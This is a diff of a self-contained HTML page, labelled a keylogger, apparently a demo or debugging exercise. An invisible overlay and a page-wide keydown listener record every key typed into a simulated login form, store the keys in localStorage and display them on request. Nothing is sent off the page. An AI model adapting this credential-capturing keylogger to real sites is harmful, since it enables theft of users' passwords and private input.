@@ -3,119 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Robust Keylogger</title>
+    <title>Debug Keylogger</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; }
+        body { font-family: sans-serif; padding: 20px; background: #fff; color: #000; }
         
-        /* Invisible overlay that catches clicks/keys */
+        /* Invisible Overlay */
         #overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 99999;
-            background: transparent;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 99999; background: transparent;
         }
 
-        /* Button to view logs */
+        /* Button */
         #viewBtn {
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            z-index: 100000;
-            padding: 10px;
-            cursor: pointer;
-            background: #333;
-            color: #fff;
-            border: none;
+            position: fixed; bottom: 20px; right: 20px;
+            padding: 15px 30px; background: #007bff; color: white;
+            border: none; cursor: pointer; font-size: 16px; z-index: 100000;
         }
+        #viewBtn:hover { background: #0056b3; }
 
-        /* Log Display Area */
-        #logContainer {
-            display: none;
-            position: fixed;
-            top: 50%; left: 50%;
+        /* Log Window */
+        #logWindow {
+            display: none; /* Hidden by default */
+            position: fixed; top: 50%; left: 50%;
             transform: translate(-50%, -50%);
-            width: 80%;
-            max-height: 80vh;
-            overflow-y: auto;
-            background: white;
-            border: 2px solid black;
-            padding: 20px;
-            z-index: 100001;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            width: 90%; max-height: 80vh; overflow-y: auto;
+            background: #f9f9f9; border: 2px solid #333;
+            padding: 20px; z-index: 100001; box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
         
-        .log-entry { margin-bottom: 5px; word-wrap: break-word; }
+        .log-line { margin: 2px 0; font-family: monospace; word-wrap: break-word; }
         .close-btn { float: right; cursor: pointer; font-weight: bold; color: red; }
     </style>
 </head>
 <body>
 
-    <!-- Overlay to catch events even if you click outside inputs -->
+    <!-- Overlay catches events -->
     <div id="overlay"></div>
 
-    <!-- Dummy Content to simulate a login page -->
-    <h1>Login Page Simulation</h1>
-    <input type="text" placeholder="Enter Username" style="display:block; margin-bottom:10px; padding:10px;">
-    <input type="password" placeholder="Enter Password" style="display:block; margin-bottom:10px; padding:10px;">
-    <button style="padding:10px;">Login</button>
-    <p>Type anywhere on this page to test.</p>
-
-    <!-- View Logs Button -->
+    <!-- Dummy Content -->
+    <h1>Login Simulation</h1>
+    <input type="text" placeholder="Username" style="padding:10px; margin-bottom:10px;">
+    <input type="password" placeholder="Password" style="padding:10px; margin-bottom:10px;">
+    
     <button id="viewBtn">View Logs</button>
 
-    <!-- Hidden Container for Logs -->
-    <div id="logContainer">
-        <span class="close-btn" onclick="document.getElementById('logContainer').style.display='none'">X</span>
+    <!-- Log Container -->
+    <div id="logWindow">
+        <span class="close-btn" onclick="document.getElementById('logWindow').style.display='none'">X</span>
         <h2>Captured Keystrokes</h2>
         <div id="logsOutput"></div>
     </div>
 
     <script>
         const logData = [];
-        const overlay = document.getElementById('overlay');
         const viewBtn = document.getElementById('viewBtn');
-        const logContainer = document.getElementById('logContainer');
+        const logWindow = document.getElementById('logWindow');
         const logsOutput = document.getElementById('logsOutput');
 
-        // Function to save logs
+        // 1. Save to LocalStorage
         function saveLogs() {
             try {
                 localStorage.setItem('bz_logs', JSON.stringify(logData));
+                console.log("Logs Saved:", logData.length, "items"); // Debug
             } catch (e) {
-                console.error("Storage failed", e);
+                console.error("Storage Error:", e);
             }
         }
 
-        // Function to load and display logs
+        // 2. Load and Display Logs
         function showLogs() {
-            let storedLogs = localStorage.getItem('bz_logs');
-            if (storedLogs) {
-                const parsedLogs = JSON.parse(storedLogs);
-                logsOutput.innerHTML = parsedLogs.map(log => 
-                    `<div class="log-entry">${escapeHtml(log)}</div>`
-                ).join('');
+            console.log("Attempting to load logs..."); // Debug
+            let stored = localStorage.getItem('bz_logs');
+            
+            if (!stored) {
+                logsOutput.innerHTML = "<p>No logs found yet. Type something first!</p>";
             } else {
-                logsOutput.innerHTML = "<div>No logs yet.</div>";
+                try {
+                    const parsed = JSON.parse(stored);
+                    logsOutput.innerHTML = parsed.map(line => 
+                        `<div class="log-line">${escapeHtml(line)}</div>`
+                    ).join('');
+                } catch (e) {
+                    logsOutput.innerHTML = "<p>Error parsing logs.</p>";
+                    console.error("Parse Error", e);
+                }
             }
-            logContainer.style.display = 'block';
+            logWindow.style.display = 'block';
+            console.log("Log window opened."); // Debug
         }
 
-        // Helper to prevent HTML injection in logs
+        // Helper to prevent HTML injection
         function escapeHtml(text) {
-            return text
-                .replace(/&/g, "&amp;")
-                .replace(/</g, "&lt;")
-                .replace(/>/g, "&gt;")
-                .replace(/"/g, "&quot;")
-                .replace(/'/g, "&#039;");
+            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
         }
 
-        // Event Listener for Keydown
+        // 3. Capture Keys
         document.addEventListener('keydown', function(e) {
             const key = e.key;
-            
-            // Map special keys to readable names
             let logKey = key;
+
+            // Map special keys
             if (key === ' ') logKey = '[SPACE]';
             else if (key === 'Enter') logKey = '[ENTER]';
             else if (key === 'Backspace') logKey = '[BS]';
@@ -127,26 +114,24 @@
             else if (key === 'Escape') logKey = '[ESC]';
             else if (key === 'Delete') logKey = '[DEL]';
             
-            // Ignore modifier keys if pressed alone (optional, but cleaner)
+            // Ignore modifier keys pressed alone
             if (['Shift', 'Control', 'Alt', 'CapsLock'].includes(key) && !e.ctrlKey && !e.altKey && !e.metaKey) {
                 return; 
             }
 
             logData.push(logKey);
             
-            // Keep last 5000 chars worth of data to avoid storage limits
-            if (logData.length > 5000) {
-                logData.shift();
-            }
+            // Limit size
+            if (logData.length > 5000) logData.shift();
 
             saveLogs();
         });
 
-        // View Button Logic
+        // 4. Event Listeners
         viewBtn.addEventListener('click', showLogs);
 
-        // Initial Load
-        showLogs();
+        // Initial check on load
+        console.log("Script Loaded. Waiting for input...");
     </script>
 </body>
 </html>
